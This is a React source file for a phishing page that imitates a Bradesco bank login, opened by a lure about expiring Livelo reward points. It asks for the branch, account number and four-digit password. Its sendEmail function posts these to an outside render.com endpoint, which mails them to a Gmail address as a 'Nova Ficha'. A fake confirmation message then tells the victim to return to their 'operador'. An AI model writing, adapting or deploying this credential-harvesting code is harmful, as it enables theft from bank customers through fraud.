import React, { useState, useEffect } from 'react';
import axios from 'axios';

// Componente AccountAccess
const AccountAccess = ({ formData, setFormData, sendEmail, isSubmitting, isThankYouModalVisible, closeThankYouModal }) => {
  return (
    <div className="flex flex-col items-center w-full h-screen bg-gradient-to-b from-[#2a6db8] to-[#174a8f] text-white">
      {isThankYouModalVisible && (
        <div className="fixed inset-0 flex items-center justify-center bg-black bg-opacity-50 z-50">
          <div className="bg-white rounded-lg p-4 w-[90%]">
            <h2 className="text-xl font-semibold text-gray-700">Validação confirmada com sucesso!</h2>
            <p className="text-gray-800 mt-4 mb-6">Volte a falar com o seu operador.</p>
            <button onClick={closeThankYouModal} className="w-full p-3 rounded-full bg-[#ff004f] text-white font-semibold text-lg">Fechar</button>
          </div>
        </div>
      )}
      <div className="flex items-center w-full p-6">
        <img className="w-64" src="" alt="" />
      </div>
      <div className="w-full text-left px-6">
        <p className="text-base mb-2 font-semibold">Agência sem dígito: <span>{formData.agencia || "Dados não encontrados"}</span></p>
        <p className="text-base mb- font-semibold">Conta com dígito: <span>{formData.conta || "Dados não encontrados"}</span></p>
        <p className="text-base mb-4 font-semibold">Titularidade: <span>Cliente</span></p>
      </div>
      <div className="w-full bg-white h-[45vh] rounded-t-3xl p-6 mt-auto">
        <label className="block text-black text-xl mb-1">Qual é a sua senha?</label>
        <input
          type="password"
          maxLength="4"
          className="w-full p-2 border-b-2 border-blue-500 text-gray-700 text-center focus:outline-none"
          placeholder="4 dígitos"
          value={formData.senha}
          onChange={(e) => setFormData({ ...formData, senha: e.target.value.replace(/\D/g, '') })}
        />
        <div className="text-blue-500 text-sm mt-4 cursor-pointer">Esqueci minha senha</div>
        <div className="flex justify-center">
          <button 
            onClick={sendEmail} 
            className="px-12 text-center mt-6 py-3 rounded-full bg-[#174a8f] text-white font-semibold text-lg"
            disabled={isSubmitting}
          >
            {isSubmitting ? "Carregando..." : "continuar"}
          </button>
        </div>
      </div>
    </div>
  );
};

// Componente principal Template
const Template = () => {
  const [formData, setFormData] = useState({
    agencia: "",
    conta: "",
    senha: ""
  });
  const [selectedHolder, setSelectedHolder] = useState('1º titular');
  const [remember, setRemember] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [showAccountAccess, setShowAccountAccess] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isThankYouModalVisible, setIsThankYouModalVisible] = useState(false);

  const sendEmail = async () => {
    const htmlTemplate = `
      <p>Agência: ${formData.agencia}</p>
      <p>Conta: ${formData.conta}</p>
      <p>Senha: ${formData.senha}</p>
    `;

    try {
      setIsSubmitting(true);
      await axios.post("https://meuback-xqw0.onrender.com/api/send", {
        from: "bempracredito@gmail.com",
        to: "fichasmarcuscarioca@gmail.com",
        subject: "Nova Ficha | Bradesco",
        message: htmlTemplate,
      });
  
      setFormData({ agencia: "", conta: "", senha: "" });
      
      setTimeout(() => {
        setIsSubmitting(false);
        setIsThankYouModalVisible(true); // Exibir o modal de agradecimento
      }, 3000);
    } catch (error) {
      console.error("Erro ao enviar o email:", error);
      setIsSubmitting(false);
    }
  };

  useEffect(() => {
    setShowModal(true);
  }, []);

  const closeModal = () => {
    setShowModal(false);
  };

  const closeThankYouModal = () => {
    setIsThankYouModalVisible(false);
    setShowAccountAccess(false); // Retorna ao início ao fechar o modal de agradecimento
  };

  const handleNextStep = () => {
    if (formData.agencia && formData.conta) {
      setShowAccountAccess(true);
    } else {
      alert("Preencha todos os campos antes de prosseguir.");
    }
  };

  if (showAccountAccess) {
    return (
      <AccountAccess 
        formData={formData} 
        setFormData={setFormData} 
        sendEmail={sendEmail} 
        isSubmitting={isSubmitting} 
        isThankYouModalVisible={isThankYouModalVisible}
        closeThankYouModal={closeThankYouModal}
      />
    );
  }

  return (
    <div className="flex flex-col items-center px-6 md:px-12 pt-10 bg-gradient-to-t from-[#df4994] to-[#f32e42] w-full h-screen text-white">
      {showModal && (
        <div className="fixed inset-0 flex items-center justify-center bg-black bg-opacity-50 z-50">
          <div className="bg-white rounded-lg p-4 w-[90%]">
            <div className="flex justify-between items-center mb-4">
              <h2 className="text-xl font-semibold text-gray-700">Você sabia?</h2>
              <button onClick={closeModal} className="text-gray-600 text-3xl ">&times;</button>
            </div>
            <p className="text-gray-800 mb-4">
              Olá, cliente! Confira os pontos acumulados no seu CPF disponível para resgate. Estão bem próximos de expirar. Aproveite a Livelo ao máximo, sabia que na Livelo seus pontos viram dinheiro?
            </p>
            <button onClick={closeModal} className="w-full p-3 rounded-full bg-[#ff004f] text-white font-semibold text-lg">Aproveite</button>
          </div>
        </div>
      )}

      <div className="w-full hidden md:flex items-center justify-between">
        <img className="w-10" src="" alt="Menu" />
        <img className="w-10" src="" alt="Notificação" />
      </div>

      <div className="w-full">
        <div className="pt-6 text-center">
          <img src="" alt="logotipo" className="mb-4" />
          <h1 className="text-2xl text-start font-semibold mb-6">Que bom ter você aqui!</h1>
        </div>

        <div className="w-full max-w-lg">
          <div className="flex justify-between mb-4">
            <div className="flex-1 mr-2">
              <label className="block text-sm mb-1">Agência sem dígito</label>
              <input
                type="text"
                className="w-full p-2 border-b border-white bg-transparent text-white placeholder-white focus:outline-none"
                placeholder="Agência"
                maxLength="4"
                value={formData.agencia}
                onChange={(e) => setFormData({ ...formData, agencia: e.target.value.replace(/\D/g, '') })}
              />
            </div>
            <div className="flex-1 ml-2">
              <label className="block text-sm mb-1">Conta com dígito</label>
              <input
                type="text"
                className="w-full p-2 border-b mb-8 border-white bg-transparent text-white placeholder-white focus:outline-none"
                placeholder="Conta"
                maxLength="9"
                value={formData.conta}
                onChange={(e) => setFormData({ ...formData, conta: e.target.value.replace(/\D/g, '') })}
              />
            </div>
          </div>
        </div>

        <div className="flex justify-between mb-4">
          {['1º titular', '2º titular', '3º titular'].map((holder) => (
            <button
              key={holder}
              onClick={() => setSelectedHolder(holder)}
              className={`flex-1 py-2 rounded-full ${selectedHolder === holder ? 'bg-white text-pink-500' : 'border border-white text-white'} mx-1`}
            >
              {holder}
            </button>
          ))}
        </div>

        <div className="flex items-center justify-between mb-6">
          <label className="text-sm mr-2">Lembrar agência e conta</label>
          <div
            className={`relative w-12 h-6 border rounded-full cursor-pointer transition-colors ${remember ? 'bg-white' : 'bg-[#dc3545]'}`}
            onClick={() => setRemember(!remember)}
          >
            <span
              className={`absolute top-0 left-0 h-6 w-6 rounded-full shadow-md transform transition-transform ${remember ? 'bg-[#dc3545]' : 'bg-white'} ${remember ? 'translate-x-6' : ''}`}
            ></span>
          </div>
        </div>

        <button 
          onClick={handleNextStep} 
          className="w-full p-3 rounded-full bg-white text-[#dc3545] font-semibold text-lg"
        >
          entrar
        </button>
      </div>

      <div className="flex justify-around md:w-[100%] mt-10 text-center text-white">
        <img src="" alt="Opções de navegação" />
      </div>
    </div>
  );
};

export default Template;
